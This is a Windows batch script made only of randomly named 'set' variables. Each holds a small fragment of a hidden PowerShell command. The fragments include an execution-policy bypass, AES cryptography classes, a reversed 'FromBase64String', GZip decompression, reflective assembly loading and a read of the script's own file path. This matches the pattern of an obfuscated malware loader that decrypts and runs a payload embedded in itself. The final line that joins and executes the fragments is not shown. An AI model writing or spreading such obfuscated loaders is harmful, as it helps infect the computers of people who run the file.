@echo off
set "JWiZDDbgWz=in $"
set "fVdTkTOIbA=);$M"
set "xFKXpuCnAK=.GZi"
set "FnhXdaOysf=;$sh"
set "oZoKtusGXI= = $"
set "jPgAUSFxaS=yste"
set "IocBOKwZHi=ptor"
set "hQqFznNsVo=$Hpt"
set "nbpqsOJCKq=lit("
set "TzRaIiSpoN=rity"
set "nXqULNUjxt=  $o"
set "xBvwxGtIdy=ress"
set "KrAGzIehgi=.-16"
set "ZdAvBuaOCG=raph"
set "MxdIsAVBZK=BC;$"
set "kbuUsNCunJ=ose("
set "JhKlhUzQyC=yste"
set "iDiFPwjCoe=.Key"
set "TxpzQkgXls=-ep "
set "GOecQQfjlX=ck($"
set "hymzsQaOPk=..-1"
set "LVvjmOeMvZ=tion"
set "DSAxqVpZcc=vj0m"
set "EShRWzUQyx=and "
set "VJJvjCNXNM=RXMn"
set "AdHfOVKozT=mDhz"
set "AZAyYOVuSk=Syst"
set "EWAZEDsxZV=ay()"
set "QtjDWPJVsh=oin "
set "PyByyKzjVu=t Sy"
set "SgKBeceWpb=esaB"
set "npfqTVeSTW=0O+g"
set "nyxXDvATor=]::N"
set "UpUbkXaiod=('%~f0'"
set "smaPHHfjzM=pStr"
set "FWVoycppcC=y.Ci"
set "wBSrLPYeAX=stem"
set "auCyqLAtzc=rans"
set "AmrSHaGrAJ=.Dis"
set "GqJdMTiMgd===')"
set "JnpBzJLgbg=.Con"
set "ToSsBNjvXt=nP ="
set "mQOXvroAgM=W.Su"
set "LDmANMRTzR='[-1"
set "klulKEJcyT=bypa"
set "FgWAiBsNwX=Fina"
set "JhXAnJcGka=e]::"
set "OGQiWszOpc=)))"
set "ZRUPcyOInI=nage"
set "kwcJvUKoQL=esFX"
set "ryrdCTWcmx=$iMK"
set "NYwPbqiyGA=[Sys"
set "PfrsEeHPaJ=ing("
set "QCkCIfLMNB=em.C"
set "unaXMHEIMx=]::("
set "iqEAiOdcLm=flec"
set "tYesvkZtKU=Comp"
set "PzAYHSlFsg=embl"
set "OXvOYQrYPq=qxgO"
set "OxGkuVeDQl=nZWD"
set "pvnOwBHMpX=esMa"
set "FoWLHjnEah=)) {"
set "rLVAoWTbis=null"
set "KqZyGeXkki= [Sy"
set "ZqlBVQwBJb=JB.T"
set "cRhHFTlsKt=gMod"
set "IUrDXYyYct=7;$M"
set "pPOshZMGip=tsWi"
set "UdUcorySae= [Sy"
set "iMiAnIVDtn=mv, "
set "OUrRHfRwYC=]::("
set "qXFminDGeG=);$i"
set "qBqIErShzN=RXMn"
set "narWwhyvtr=k; }"
set "PCLNgTxnfg=y]::"
set "cyaLDJObKE=ke($"
set "tQfMuKmxjn=nP);"
set "CQZQfNqIDQ=trea"
set "gNmVfRXHvn=lBlo"
set "pPLnFvfhiC=();$"
set "CrQLAFKLrm=pose"
set "UssExZCxhH=e = "
set "dxbPLGRJTp=comp"
set "SeLkJoWdUY=+hAO"
set "BunXURDPZM=.Mem"
set "wciZDkiCZB=ZYYc"
set "GySZoHPWlG=:('g"
set "kiWgDeWori=File"
set "jZzTLPQtDo= = ["
set "eYTIXwaxZX='gni"
set "RrxLQIAOUo=ateD"
set "ANpGPpwFNM=tS46"
set "tvKGbkJDnS=orF'"
set "NBQEzyyEpn=em.I"
set "SFsXskjwLf=;$Sq"
set "AzOEYgGJye=sGUc"
set "fUzznccGrI=th('"
set "LqTPHONIqz=d;$M"
set "prrqSBuKBG=Mn.I"
set "UNYbtkyyxY=ress"
